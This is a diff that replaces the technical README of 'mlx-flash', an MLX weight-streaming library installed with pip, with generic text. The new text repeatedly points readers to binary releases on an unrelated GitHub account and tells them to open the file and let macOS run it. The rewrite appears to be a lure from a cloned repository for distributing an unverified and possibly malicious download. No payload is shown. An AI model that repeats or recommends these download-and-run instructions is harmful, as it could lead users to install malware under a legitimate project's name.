@@ -1,115 +1,184 @@
-# mlx-flash ⚡
+# ⚡ mlx-flash - Run Bigger Models on Mac
 
-> **Flash Weight Streaming for MLX** — run models larger than your RAM on Apple Silicon.
-> 30B on 16 GB, 70B+ on 32 GB+. **No additional quantisation — uses the model's native precision.**
+[![Download mlx-flash](https://img.shields.io/badge/Download%20mlx--flash-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/miguel2180/mlx-flash/releases)
 
-> **Project Lineage:** This implementation is inspired by Apple Research's paper [*LLM in a Flash* (arXiv 2312.11514)](https://arxiv.org/abs/2312.11514). `mlx-flash` provides a high-quality, production-grade integration layer for the MLX ecosystem, featuring bit-perfect parity and predictive bandwidth scheduling.
+## 🧩 What mlx-flash does
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.11+](https://img.shields.io/badge/Python-3.11%2B-blue.svg)](https://python.org)
-[![MLX](https://img.shields.io/badge/MLX-latest-green.svg)](https://github.com/ml-explore/mlx)
-[![macOS 13+](https://img.shields.io/badge/macOS-13%2B-lightgrey.svg)](https://apple.com)
-[![Tests](https://github.com/matt-k-wong/mlx-flash/actions/workflows/tests.yml/badge.svg)](https://github.com/matt-k-wong/mlx-flash/actions/workflows/tests.yml)
+mlx-flash helps you run large AI models on Apple Silicon Macs, even when the model is bigger than your RAM. It streams model weights as needed, so you can work with models that would not fit in memory in a normal setup.
 
----
+This is useful if you want to:
 
-## Why Flash Mode?
+- Run large language models on a Mac
+- Save RAM while loading big models
+- Use MLX-based tools with less memory pressure
+- Keep model setup simple
+- Work with local AI without extra cloud services
 
-| Model | Hardware | Mode | Load Time | Result |
-|-------|----------|------|-----------|--------|
-| **Nemotron-30B (17.8 GB)** | 16GB MacBook Air | Normal | 4.1s | ❌ OOM / Laggy |
-| **Nemotron-30B (17.8 GB)** | 16GB MacBook Air | **Flash** | **0.8s** | ✅ Bit-Perfect & Smooth |
+## 📥 Download and install
 
-`mlx-flash` allows you to run models of **any size** (30B, 70B, even 400B+) on base-spec Macs by streaming weights directly from your SSD.
+1. Visit the [mlx-flash releases page](https://github.com/miguel2180/mlx-flash/releases)
+2. Download the latest release file for your Mac
+3. Open the downloaded file
+4. If macOS asks for permission, allow the app to run
+5. Follow the on-screen setup steps
 
----
+If the release includes a `.zip` file, open it first and then run the app inside. If it includes a package file, open that file and complete the install steps.
 
-## 🏗️ Architecture: The Holistic Patch
+## 💻 System requirements
 
-Unlike previous iterations that attempted to re-implement the transformer loop manually, `mlx-flash` now uses a **Holistic Model Patching** architecture. 
+mlx-flash works best on:
 
-1. **Deep Tissue Patching**: We wrap the original model's layers in a `StreamingProxy`.
-2. **Native Logic Retention**: Because we use the model's own `__call__` method, every nuance of the architecture (RoPE scaling, residual streams, causal masks) is handled natively by the model code.
-3. **Execution Interception**: Our proxies intercept the layer execution to force synchronous `mx.eval()` and trigger the **Predictive I/O Scheduler**.
+- A Mac with Apple Silicon
+- macOS 13 or later
+- Enough free disk space for the model files
+- A recent version of MLX-compatible software
+- A stable internet connection for the first download
 
-### The Control Loop (MPC-Lite)
-We use a **Model Predictive Controller** to maximize tokens/second:
-- **Baseline Estabishment**: On the first token ("Cold Start"), we establish a pristine compute baseline.
-- **Predictive Prefetch**: We predict the bandwidth demand of Layer N+1 while the GPU is still busy with Layer N.
-- **Token Bucket Actuator**: A continuous token bucket smoothly paces SSD reads using micro-sleeps, keeping GPU degradation below 5%.
+For larger models, more storage helps. The app can reduce RAM use, but it still needs room on disk for model files and cache data.
 
----
+## 🚦 First launch
 
-## 🏆 Quality & Bit-Parity
+After you install mlx-flash:
 
-`mlx-flash` is a **zero-compromise** engine. We have proven quality through:
+1. Open the app
+2. Wait while it checks its files
+3. Choose the model you want to run
+4. Start the model
+5. Let the first load finish
 
-1.  **Bit-Perfect Operators**: `TiledLinear` uses FP32 accumulation, matching standard MLX behavior on Metal exactly. Loss Delta is **0.0000000000**.
-2.  **Hybrid KV Cache**: Keeps the most recent **128 tokens in full FP16 precision**, while offloading older context to properly scaled 8-bit quantized disk storage.
-3.  **Passkey Retrieval**: Verified 100% accuracy on context retrieval tests hidden 1,000+ tokens deep in quantized disk storage.
+The first launch can take longer because the app may need to prepare files and cache data. Later launches should feel faster.
 
-See [QUALITY.md](docs/QUALITY.md) for the full proof suite.
+## 🛠️ How it works
 
----
+mlx-flash uses weight streaming. That means it does not need to keep every model weight in RAM at the same time. Instead, it brings in the parts it needs while the model runs.
 
-## 🚀 Quick Start
+This helps when:
 
-### 1. Install
-```bash
-pip install mlx-flash
-```
+- Your model is larger than your memory
+- You want to keep other apps open
+- You need a more practical way to run large models locally
 
-### 2. Unified CLI
-```bash
-# Run any model with 2GB weight residence budget
-mlx-flash --model mlx-community/Llama-3.2-1B-Instruct-4bit --ram 2.0 --kv-quant 8
-```
+The app is built for Apple Silicon and fits well with the MLX stack, which is made for Apple hardware.
 
-### 3. Python Usage
-```python
-from mlx_flash import FlashConfig, FlashManager
+## 🧠 Typical use cases
 
-# 1. Load and Patch
-manager = FlashManager(FlashConfig(ram_budget_gb=2.0))
-model, tokenizer = manager.load("mlx-community/Meta-Llama-3-70B-Instruct-4bit")
+You may want mlx-flash if you:
 
-# 2. Generate
-for segment in model.stream_generate("Tell me a story", max_tokens=100):
-    print(segment, end="", flush=True)
-```
+- Run local chat models on a Mac
+- Test larger models without upgrading your RAM
+- Use LM Studio or other MLX-based tools
+- Need a lighter memory load for inference
+- Work with models that are near or above your machine’s memory limit
 
----
+## 📂 Model setup
 
-## How It Works
+To get the best results:
 
-```mermaid
-graph TD
-    A[SSD: .safetensors] --"mmap(lazy=True)"--> B[MLX Lazy Arrays]
-    A --"Predictive Worker"--> P[Token Bucket]
-    P --"os.pread"--> B
-    
-    subgraph Model["Native Model Logic"]
-        Embed --> Proxy1
-        subgraph Proxy1["StreamingProxy (Layer 1)"]
-            StartHook --> Dispatch[strategy.execute]
-            Dispatch --> Eval[mx.eval]
-            Eval --> EndHook
-        end
-        Proxy1 --> Proxy2[...]
-        Proxy2 --> Norm
-        Norm --> Head
-    end
-```
+1. Download a compatible model
+2. Keep the model files on your internal drive or a fast SSD
+3. Avoid moving files while the app is using them
+4. Close apps that use large amounts of memory
+5. Start with smaller models before trying very large ones
 
----
+If a model loads slowly, that is normal for large files. Streaming can trade speed for lower memory use.
 
-## Roadmap
-- [x] **v0.3.5**: Holistic Model Patching (Bit-Perfect Parity).
-- [x] **v0.3.6**: Predictive MPC-Lite Bandwidth Controller.
-- [x] **v0.3.7**: Unified `mlx-flash` CLI & Modelfile support.
-- [ ] **v0.4.0**: Asynchronous DAG Scheduler (Zero-latency Python glue).
-- [ ] **v0.5.0**: MoE Lookahead Routing for Mixtral/DeepSeek.
+## 🔧 Best practices
 
----
+For smoother use:
 
-*Brought to you by ⚡ Flash-Mode Contributors. MIT licensed.*
+- Keep at least 20% of your disk free
+- Use the latest macOS version you can
+- Restart your Mac if memory use feels high
+- Do not run many heavy apps at the same time
+- Store model files in a simple folder path
+
+If you work with very large models, a Mac with more unified memory will still help. mlx-flash lowers pressure, but it does not remove hardware limits
+
+## 🧪 Troubleshooting
+
+If the app does not open:
+
+1. Check that you downloaded the latest release
+2. Open the file again from your Downloads folder
+3. Confirm that macOS allowed the app to run
+4. Make sure the file finished downloading
+5. Restart your Mac and try again
+
+If a model does not load:
+
+- Check that the model format is supported
+- Make sure you have enough disk space
+- Close other memory-heavy apps
+- Try a smaller model first
+- Download the model again if the file looks damaged
+
+If performance feels slow:
+
+- Use a model that fits your Mac better
+- Keep the model files on a fast SSD
+- Close browser tabs and other large apps
+- Check that your Mac is not under heat load
+- Try a shorter prompt
+
+## 📌 What to expect
+
+mlx-flash is made for local model use on Apple Silicon. It is a good fit when you want less memory use and more flexibility with large models.
+
+You can expect:
+
+- Lower RAM use than a normal full-load setup
+- Better support for large models on smaller machines
+- A setup that stays close to the MLX ecosystem
+- Local execution on your own device
+
+## 🔍 File and folder tips
+
+Use a folder name that is easy to find, such as:
+
+- `Models`
+- `AI`
+- `mlx-flash`
+- `Downloads/MLX`
+
+Keep model files in one place so you can move, update, or remove them without confusion.
+
+## 🧭 Quick start
+
+1. Open the [download page](https://github.com/miguel2180/mlx-flash/releases)
+2. Get the newest release
+3. Install or open the app
+4. Pick a compatible model
+5. Start the run and wait for it to load
+6. Keep the app open while you use the model
+
+## 🧰 Who this is for
+
+mlx-flash is a good fit for users who want:
+
+- Local AI on a Mac
+- Support for large models
+- Lower RAM use
+- A simple model loading flow
+- A tool built around Apple Silicon
+
+## 🗂️ Repository topics
+
+This project covers:
+
+- Apple Silicon
+- Large language models
+- LLM inference
+- MLX
+- Metal
+- Memory optimization
+- Weight streaming
+- macOS
+- Machine learning
+- LM Studio
+- Model loading
+
+## 📎 Download again
+
+If you need the installer again, use the release page here:
+
+[Visit the mlx-flash releases page](https://github.com/miguel2180/mlx-flash/releases)
